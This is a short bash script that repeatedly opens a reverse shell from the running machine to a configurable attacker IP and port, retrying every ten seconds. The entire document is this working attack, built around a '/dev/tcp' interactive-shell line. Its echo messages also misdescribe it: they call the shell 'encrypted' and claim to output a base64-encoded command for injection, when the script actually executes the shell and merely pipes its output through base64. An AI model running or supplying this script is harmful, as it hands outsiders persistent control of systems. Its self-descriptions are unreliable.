#!/bin/bash

ATTACKER_IP=${1:-"192.168.1.100"}
ATTACKER_PORT=${2:-"443"}

while :
do
  echo "[*] Attempting encrypted shell to $ATTACKER_IP:$ATTACKER_PORT..."
  echo "[*] Base64 encoded command for injection:"
  bash -c "bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1" | base64
  sleep 10
done
